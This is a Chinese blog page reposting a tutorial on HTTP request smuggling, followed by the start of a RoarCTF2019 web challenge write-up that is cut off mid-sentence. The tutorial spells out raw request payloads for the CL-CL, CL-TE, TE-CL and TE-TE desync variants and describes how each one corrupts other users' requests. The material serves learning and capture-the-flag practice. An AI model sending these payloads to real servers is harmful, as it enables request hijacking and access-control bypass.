@@ -1,0 +1,525 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HTTP走私 | upload</title><meta name="author" content="upload"><meta name="copyright" content="upload"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Welcome to my blog 😁😁😁😁">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP走私">
+<meta property="og:url" content="http://upload.love/2021/04/23/HTTP%E8%B5%B0%E7%A7%81/index.html">
+<meta property="og:site_name" content="upload">
+<meta property="og:description" content="Welcome to my blog 😁😁😁😁">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://upload.love/image/buu.png">
+<meta property="article:published_time" content="2021-04-23T15:54:13.000Z">
+<meta property="article:modified_time" content="2021-08-06T16:09:22.000Z">
+<meta property="article:author" content="upload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://upload.love/image/buu.png"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="http://upload.love/2021/04/23/HTTP%E8%B5%B0%E7%A7%81/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-07 00:09:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="upload" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">upload</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTTP走私</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-23T15:54:13.000Z" title="发表于 2021-04-23 23:54:13">2021-04-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-06T16:09:22.000Z" title="更新于 2021-08-07 00:09:22">2021-08-07</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><code>https://www.anquanke.com/post/id/210036#h2-0</code></p>
+<h1 id="从一道题到HTTP请求走私"><a href="#从一道题到HTTP请求走私" class="headerlink" title="从一道题到HTTP请求走私"></a>从一道题到HTTP请求走私</h1><p> 漏洞原理 &gt; 协议层漏洞 题目复现 HTTP HTTP请求走私</p>
+<p>发布时间 :2019-10-27 23:13</p>
+<p>字数:4.3k 阅读 :73</p>
+<h3 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h3><p>首发在先知社区</p>
+<p>之前一次线上赛，遇到一道Web题，涉及了HTTP请求走私。由于之前未学习过，从而我展开了HTTP请求走私的学习之旅。</p>
+<h3 id="0x01-HTTP请求走私是什么"><a href="#0x01-HTTP请求走私是什么" class="headerlink" title="0x01 HTTP请求走私是什么"></a>0x01 HTTP请求走私是什么</h3><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p>
+<h3 id="0x02-为什么会产生HTTP请求走私"><a href="#0x02-为什么会产生HTTP请求走私" class="headerlink" title="0x02 为什么会产生HTTP请求走私"></a>0x02 为什么会产生HTTP请求走私</h3><p><strong>请求走私漏洞成因</strong></p>
+<blockquote>
+<p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p>
+</blockquote>
+<p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。<br>同时使用两种不同的方法时，<code>Content-Length</code>无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为<code>Content-Length</code>的长度有效，有些以<code>Transfer-Encoding</code>有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。</p>
+<p><strong>RFC2616规范</strong></p>
+<blockquote>
+<p>如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。</p>
+</blockquote>
+<p>由于规范默许可以使用<code>Transfer-Encoding</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。</p>
+<p><strong>走私攻击实现</strong><br>当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
+<h4 id="扩展：为什么会出现多次请求"><a href="#扩展：为什么会出现多次请求" class="headerlink" title="扩展：为什么会出现多次请求"></a>扩展：为什么会出现多次请求</h4><p>这与最为广泛的HTTP 1.1的协议特性——<code>Keep-Alive&amp;Pipeline</code>有关。<br>在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。<br>而现代的Web页面是由多种资源组成的，要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种资源，如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p>
+<p><strong>Keep-Alive</strong>：在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭<code>TCP链接</code>，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在<code>HTTP1.1</code>中默认开启的。<br>**Pipeline(http管线化)**：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的<code>HTTP</code>请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p>
+<p>现在，浏览器默认不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。<br>下面这是典型的CDN加速图和拓扑结构图<br>CDN加速图</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235429.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<p>拓扑结构图</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235429.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<h3 id="0x03-如何执行HTTP请求走私攻击"><a href="#0x03-如何执行HTTP请求走私攻击" class="headerlink" title="0x03 如何执行HTTP请求走私攻击"></a>0x03 如何执行HTTP请求走私攻击</h3><p>HTTP请求走私攻击涉及将<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p>
+<blockquote>
+<p>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。<br>TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。<br>TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p>
+</blockquote>
+<h3 id="0x04-HTTP请求走私攻击的五种方式"><a href="#0x04-HTTP请求走私攻击的五种方式" class="headerlink" title="0x04 HTTP请求走私攻击的五种方式"></a>0x04 HTTP请求走私攻击的五种方式</h3><h4 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h4><p>所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。<br>前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p>
+<p><strong>构造请求示例</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\r\n&#96;是换行的意思，windows的换行是&#96;\r\n&#96;，unix的是&#96;\n&#96;，mac的是&#96;\r</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><strong>攻击流程</strong>：<br>前端服务器收到该请求，读取<code>Content-Length</code>，判断这是一个完整的请求。<br>然后转发给后端服务器，后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，后端服务器就认为这是收到了两个请求，分别是：</p>
+<p>第一个：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>第二个：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>所以造成了请求走私。</p>
+<h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p><strong>RFC7230规范</strong></p>
+<blockquote>
+<p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p>
+</blockquote>
+<p>有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。<br>但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。<br><strong>构造请求示例</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">abash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击流程</strong>：<br>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。<br>而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。<br>如果此时有一个其他的正常用户对服务器进行了请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aGET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>这时，用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。</p>
+<p>但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？<br>所以想到前面所说的<br><strong>RFC2616规范</strong></p>
+<blockquote>
+<p>如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>这两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>。</p>
+</blockquote>
+<p>所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。</p>
+<h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头。</p>
+<p><strong>chunk传输数据(size的值由16进制表示)</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br><span class="line">bash复制代码</span><br><span class="line">bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p><strong>chunked编码</strong><br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yankai0219/article/details/8269922">http协议中content-length 以及chunked编码分析</a><br><strong>构造请求示例</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">abash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>连续发送几次请求就可以获得响应。<br><strong>攻击流程</strong>：<br>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">abash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>认为已经读取到结尾了。<br>但剩下的字母<code>a</code>就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......bash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>服务器在解析时就会产生报错了，从而造成HTTP请求走私。</p>
+<h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>请求头，后端服务器处理<code>Content-Length</code>请求头。<br><strong>构造请求示例</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">aPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击流程</strong>：<br>前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>认为是读取完毕了。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，因为请求体的长度为<code>4</code>.也就是当它读取完</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12\r\n</span><br><span class="line">bash复制代码</span><br><span class="line">bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>就认为这个请求已经结束了。后面的数据就认为是另一个请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>成功报错，造成HTTP请求走私。</p>
+<h4 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。在某种意义上这还是<code>CL-TE</code>或者<code>TE-CL</code>。<br><strong>构造请求示例</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">aPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x&#x3D;1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击流程</strong>：<br>前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>认为是读取结束。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理<code>Transfer-encoding</code>请求头，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。读取到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5c\r\n</span><br><span class="line">bash复制代码</span><br><span class="line">bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>认为是读取完毕了。后面的数据就认为是另一个请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x&#x3D;1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\nbash复制代码bash复制代码</span><br></pre></td></tr></table></figure>
+
+<p>成功报错，造成HTTP请求走私。</p>
+<h3 id="0x05-HTTP请求走私实战"><a href="#0x05-HTTP请求走私实战" class="headerlink" title="0x05 HTTP请求走私实战"></a>0x05 HTTP请求走私实战</h3><p>在我学HTTP请求走私之前，正是因为碰到一道Web题要使用HTTP请求走私。现在复现一下</p>
+<h4 id="RoarCTF2019-Web：easy-calc"><a href="#RoarCTF2019-Web：easy-calc" class="headerlink" title="RoarCTF2019-Web：easy_calc"></a>RoarCTF2019-Web：easy_calc</h4><p>进去发现是个计算器</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235429.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<p>这道题是国赛的love_math的修改版。国赛题<code>love_math</code>参考Smi1e师傅的Writeup：<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/">国赛love_math题解</a><br>输入<code>calc.php</code>，发现了网站源码</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235429.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<p>这道题除去了长度限制，payload中不能包含</p>
+<blockquote>
